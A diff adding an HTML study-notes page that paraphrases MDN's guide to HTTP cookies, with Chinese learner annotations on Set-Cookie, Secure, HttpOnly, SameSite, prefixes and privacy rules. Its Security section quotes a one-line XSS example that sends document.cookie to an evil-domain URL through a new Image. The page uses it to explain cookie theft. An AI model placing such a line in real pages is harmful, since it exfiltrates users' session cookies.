@@ -1,0 +1,282 @@
+<nav>
+    <ul>
+        <li><a href="/pages/web-development/http/docs/1-an-overview-of-http.html">1-an-overview-of-http.html</a>
+        </li>
+        <li><a href="/pages/web-development/http/docs/2-http-caching.html">2-http-caching.html</a></li>
+        <li><a href="/pages/web-development/http/docs/3-http-cookies.html">3-http-cookies.html</a></li>
+    </ul>
+</nav>
+<section>
+    <h2>Using HTTP cookies</h2>
+</section>
+<section>
+    <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">
+            HTTP - HTTP cookies
+        </a>，记住cookies是HTTP的</p>
+    <p>在使用cookies之前，应该先了解一下什么是cookie？和storage的区别是什么？</p>
+    <p>cookie中文翻译是饼干，小甜点，为什么这么叫？</p>
+</section>
+
+<section>
+    <h2>Security</h2>
+    <p>看这个代码
+        <code>(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;</code>
+        我觉得是别人想办法在你的脚本里创建一个新的图片，只要图片生成了，那么首先这个是会访问这个evail-domain，
+        首先这个document.cookie会拿到用户浏览器中的cookie，之后后端程序可以通过图片访问的情况下拿到这个document.cookie
+
+        首先一种用户访问的是有害的网站，不是你的网站
+        另一种是用户访问的是自己开发的网站，但是被注入了脚本？ XSS
+    </p>
+</section>
+
+<section>
+    <p>An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web
+        browser. The browser may store it and send it back with later requests to the same server. Typically, it's used
+        to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers
+        stateful information for the stateless HTTP protocol.</p>
+    <p>Cookies are mainly used for three purposes:</p>
+    <dl>
+        <dt>session management</dt>
+        <dd>logins, shopping carts, game scores, or anything else the server should remember</dd>
+        <dt>personalization</dt>
+        <dd>user preferences, themes, and other things</dd>
+        <dt>tracking</dt>
+        <dd>recording and analyzing user behavior</dd>
+    </dl>
+    <p>Cookies were once used for general client-side storage. While this was legitimate when they were the only way to
+        store data on the client, it is now recommended to use modern storage APIs. Cookies are sent with every request,
+        so they can worsen performance (especially for mobile data connections). Modern APIs for client storage are the
+        Web Storage API (localStorage and sessionStorage) and IndexedDB.</p>
+    <p class="warning">To see stored cookies (and other storage that a web page can use), you can enable the Storage
+        Inspector in Developer Tools and select Cookies from the storage tree.</p>
+</section>
+<section>
+    <h2>creating cookies</h2>
+    <p>After receiving an HTTP request, a server can send a Set-Cookie header with the response. The cookie is usually
+        stored by the browser, and then the cookie is sent with requests made to the same server inside a Cookie HTTP
+        header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additional
+        restrictions to a specific domain and path can be set, limiting where the cookie is sent. For details about the
+        header attributes mentioned below, refer to the Set-Cookie reference article.</p>
+    <section>
+        <h3>the set-cookie and cookie headers</h3>
+        <p>The Set-Cookie HTTP response header sends cookies from the server to the user agent. A simple cookie is set
+            like this:</p>
+        <pre><code>
+           Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;
+    </code></pre>
+        <p>This shows the server sending headers to tell the client to store a pair of cookies:</p>
+        <pre><code>
+        HTTP/2.0 200 OK
+Content-Type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+    </code></pre>
+        <p>Then, with every subsequent request to the server, the browser sends back all previously stored cookies to
+            the server using the Cookie header.</p>
+        <pre><code>
+        GET /sample_page.html HTTP/2.0
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+    </code></pre>
+        <p class="warning">Here's how to use the Set-Cookie header in various server-side applications:
+
+            PHP
+            Node.JS
+            Python
+            Ruby on Rails
+        </p>
+    </section>
+    <section>
+        <h3>define the lifetime of a cookie</h3>
+        <p>The lifetime of a cookie can be defined in two ways:</p>
+        <ul>
+            <li>Session cookies are deleted when the current session ends. The browser defines when the "current
+                session" ends, and some browsers use session restoring when restarting, which can cause session cookies
+                to last indefinitely long.</li>
+            <li>Permanent cookies are deleted at a date specified by the Expires attribute, or after a period of time
+                specified by the Max-Age attribute.</li>
+        </ul>
+        <p>For example:</p>
+        <pre><code>
+            Set-Cookie: id=a3fWa; Expires=Wed, 31 Oct 2021 07:28:00 GMT;
+        </code></pre>
+        <p class="wanring">When an Expires date is set, the time and date set is relative to the client the cookie is
+            being set on, not the server.</p>
+        <p>If your site authenticates users, it should regenerate and resend session cookies, even ones that
+            already exist, whenever the user authenticates. This technique helps prevent session fixation
+            attacks, where a third party can reuse a user's session.</p>
+    </section>
+    <section>
+        <h3>restrict access to cookies</h3>
+        <p>There are a couple of ways to ensure that cookies are sent securely and are not accessed by unintended
+            parties or scripts: the Secure attribute and the HttpOnly attribute.</p>
+        <p><strong>Secure attrubute</strong> https only</p>
+        <p>A cookie with the Secure attribute is sent to the server only with an encrypted request over the HTTPS
+            protocol, never with unsecured HTTP, and therefore can't easily be accessed by a man-in-the-middle attacker.
+            Insecure sites (with http: in the URL) can't set cookies with the Secure attribute. However, do not assume
+            that Secure prevents all access to sensitive information in cookies; for example, it can be read by someone
+            with access to the client's hard disk.</p>
+        <p>A cookie with the HttpOnly attribute is inaccessible to the JavaScript Document.cookie API; it is sent only
+            to the server. For example, cookies that persist server-side sessions don't need to be available to
+            JavaScript, and should have the HttpOnly attribute. This precaution helps mitigate cross-site scripting
+            (XSS) attacks.</p>
+        <p><strong>HttpOnly attribute</strong> inaccessible to js Document.cookie API</p>
+        <p>Here is an example:</p>
+        <pre><code>
+            Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
+        </code></pre>
+    </section>
+    <section>
+        <h3>define where cookies are sent</h3>
+        <p>The Domain and Path attributes define the scope of the cookie: what URLs the cookies should be sent to.</p>
+        <section>
+            <h4>domain attribute</h4>
+            <p>The Domain attribute specifies which hosts are allowed to receive the cookie. If unspecified, it defaults
+                to the same origin that set the cookie, excluding subdomains. If Domain is specified, then subdomains
+                are always included. Therefore, specifying Domain is less restrictive than omitting it. However, it can
+                be helpful when subdomains need to share information about a user.</p>
+            <p>For example, if Domain=mozilla.org is set, then cookies are available on subdomains like
+                developer.mozilla.org.</p>
+        </section>
+        <section>
+            <h4>path attribute</h4>
+            <p>The Path attribute indicates a URL path that must exist in the requested URL in order to send the Cookie
+                header. The %x2F ("/") character is considered a directory separator, and subdirectories match as well.
+            </p>
+            <p>For example, if Path=/docs is set, these paths match:</p>
+            <ul>
+                <li>/docs</li>
+                <li>/docs/Web/</li>
+                <li>/docs/Web/HTTP</li>
+            </ul>
+        </section>
+        <section>
+            <h4>SameSite attribute</h4>
+            <p>The SameSite attribute lets servers require that a cookie shouldn't be sent with cross-origin requests
+                (where Site is defined by the registrable domain), which provides some protection against cross-site
+                request forgery attacks (CSRF).</p>
+            <p>It takes three possible values: Strict, Lax, and None. With Strict, the cookie is sent only to the same
+                site as the one that originated it; Lax is similar, with an exception for when the user navigates to a
+                URL from an external site, such as by following a link; None has no restrictions on cross-site requests.
+            </p>
+            <p>It takes three possible values: Strict, Lax, and None.</p>
+            <dl>
+                <dt>strict</dt>
+                <dd>the cookie is sent only to the same site as the one that originated it;</dd>
+                <dt>lax</dt>
+                <dd>Lax adj. 不严格的 is similar, with an exception for when the user navigates to a URL from an
+                    external site, such as by following a link; </dd>
+                <dt>none</dt>
+                <dd>None has no restrictions on cross-site requests</dd>
+            </dl>
+            <p>Here is an example:</p>
+            <pre><code>
+                Set-Cookie: mykey=myvalue; SameSite=Strict
+            </code></pre>
+            <p>The values of SameSite attribute are case-insensitive.</p>
+            <p class="warning">Browsers are migrating to have cookies default to SameSite=Lax. If a cookie is needed to
+                be sent cross-origin, opt out of the SameSite restriction by using the None directive. The None
+                directive requires that the Secure attribute also be used.</p>
+        </section>
+        <section>
+            <h4>cookie prefixes</h4>
+            <p>The design of the cookie mechanism is such that a server is unable to confirm that a cookie
+                was set on a secure origin or even to tell where a cookie was originally set.</p>
+            <p>A vulnerable application on a sub-domain can set a cookie with the Domain attribute, which gives access
+                to that cookie on all other subdomains. This mechanism can be abused in a session fixation attack. See
+                session fixation for primary mitigation methods.</p>
+            <p>This mechanism can be abused in a session fixation attack. See session fixation for primary
+                mitigation methods.</p>
+            <p>As a defence-in-depth measure, however, it is possible to use cookie prefixes to assert specific facts
+                about the cookie. Two prefixes are available:</p>
+            <dl>
+                <dt>__Host-</dt>
+                <dd>If a cookie name has this prefix, it is accepted in a Set-Cookie header only if it is
+                    also marked with the Secure attribute, was sent from a secure origin, does not include a
+                    Domain attribute, and has the Path attribute set to /. In this way, these cookies can be
+                    seen as "domain-locked".</dd>
+                <dt>__Secure-</dt>
+                <dd>If a cookie name has this prefix, it is accepted in a Set-Cookie header only if it is
+                    marked with the Secure attribute and was sent from a secure origin. This is weaker than
+                    the __Host- prefix.</dd>
+            </dl>
+            <hr>
+         <p>Cookies with these prefixes that are not compliant with their restrictions are rejected by the browser. Note that this ensures that if a subdomain were to create a cookie with a prefix, it would either be confined to the subdomain or be ignored completely. As the application server checks for a specific cookie name only when determining if the user is authenticated or a CSRF token is correct, this effectively acts as a defence measure against session fixation.</p>
+         <p class="warning">On the application server, the web application must check for the full cookie name including the prefix—user agents do not strip the prefix from the cookie before sending it in a request's Cookie header.</p>
+         <p>For more information about cookie prefixes and the current state of browser support, see the Prefixes section of the Set-Cookie reference article.</p>
+        </section>
+        <section>
+            <h4>javascript access using document.cookie</h4>
+            <p>New cookies can be created via JavaScript using the Document.cookie property, and existing
+                cookies can be accessed from JavaScript as well, if the HttpOnly flag is not set.</p>
+            <pre><code>
+                document.cookie = "yummy_cookie=choco"; 
+                document.cookie = "tasty_cookie=strawberry"; 
+                console.log(document.cookie); 
+                // logs "yummy_cookie=choco; tasty_cookie=strawberry"
+            </code></pre>
+            <p>Cookies created via JavaScript cannot include the HttpOnly flag.</p>
+            <p>Please note the security issues in the Security section below. Cookies available to JavaScript can be stolen through XSS.</p>
+        </section>
+    </section>
+</section>
+<section>
+    <h2>security</h2>
+    <p class="warning">Information should be stored in cookies with the understanding that all cookie values
+        are visible to, and can be changed by, the end-user. Depending on the application, it may be
+        desirable to use an opaque identifier which is looked-up by the server or to investigate alternative
+        authentication/confidentiality mechanisms such as JSON Web Tokens.</p>
+    <p>Ways to mitigate attacks involving cookies:</p>
+    <ul>
+        <li>Use the HttpOnly attribute to prevent access to cookie values via JavaScript.</li>
+        <li>Cookies that are used for sensitive information (such as indicating authentication) should have
+            a short lifetime, with the SameSite attribute set to Strict or Lax. (See SameSite cookies,
+            above.) In browsers that support SameSite, this has the effect of ensuring that the
+            authentication cookie is not sent with cross-origin requests, so such a request is effectively
+            unauthenticated to the application server.</li>
+    </ul>
+</section>
+<section>
+    <h2>tracking and privacy</h2>
+    <section>
+        <h3>third-party cookies</h3>
+        <p>A cookie is associated with a domain. If this domain is the same as the domain of the page you are on, the cookie is called a first-party cookie. If the domain is different, it is a third-party cookie. While the server hosting a web page sets first-party cookies, the page may contain images or other components stored on servers in other domains (for example, ad banners), which may set third-party cookies. These are mainly used for advertising and tracking across the web. See for example the types of cookies used by Google. A third party server can build up a profile of a user's browsing history and habits based on cookies sent to it by the same browser when accessing multiple sites. Firefox, by default, blocks third-party cookies that are known to contain trackers. Third-party cookies (or just tracking cookies) may also be blocked by other browser settings or extensions. Cookie blocking can cause some third-party components (such as social media widgets) to not function as intended.</p>
+    </section>
+    <section>
+        <h3>cookie-related regulations</h3>
+        <p>Legislation or regulations that cover the use of cookies include:</p>
+        <ul>
+            <li>The General Data Privacy Regulation (GDPR) in the European Union</li>
+            <li>The ePrivacy Directive in the EU</li>
+            <li>The California Consumer Privacy Act</li>
+        </ul>
+        <p>These regulations have global reach, because they apply to any site on the World Wide Web that is accessed by users from these jurisdictions (the EU and California, with the caveat that California's law applies only to entities with gross revenue over 25 million USD, among other things.)</p>
+        <p>These regulations include requirements such as:</p>
+        <ul>
+            <li>Notifying users that your site uses cookies.</li>
+            <li>Allowing users to opt out of receiving some or all cookies.</li>
+            <li>Allowing users to use the bulk of your service without receiving cookies.</li>
+        </ul>
+        <p>There may be other regulations governing the use of cookies in your locality. The burden is on you to know and comply with these regulations. There are companies that offer "cookie banner" code that helps you comply with these regulations.</p>
+    </section>
+</section>
+<section>
+    <h2>other ways to store information in the browser</h2>
+    <p>Another approach to storing data in the browser is the Web Storage API. The window.sessionStorage and window.localStorage properties correspond to session and permanent cookies in duration, but have larger storage limits than cookies, and are never sent to a server. More structured and larger amounts of data can be stored using the IndexedDB API, or a library built on it.</p>
+    <p>Other techniques have been created to cause cookies to be recreated after they are deleted, known as "zombie" cookies. These techniques violate the principles of user privacy and user control, may violate data privacy regulations, and could expose a website using them to legal liability.</p>
+    <p>web storage api</p>
+    <ul>
+        <li>window.sessionStorage: session cookies in duration</li>
+        <li>window.localStorage vs permanent cookies in duration</li>
+        <li>indexedDB API</li>
+        <li>"zombie" cookies, been created to cause cookies to be recreated after they are deleted</li>
+    </ul>
+</section>
+<section>
+    <h3></h3>
+</section>
+<section>
+    <h4></h4>
+</section>
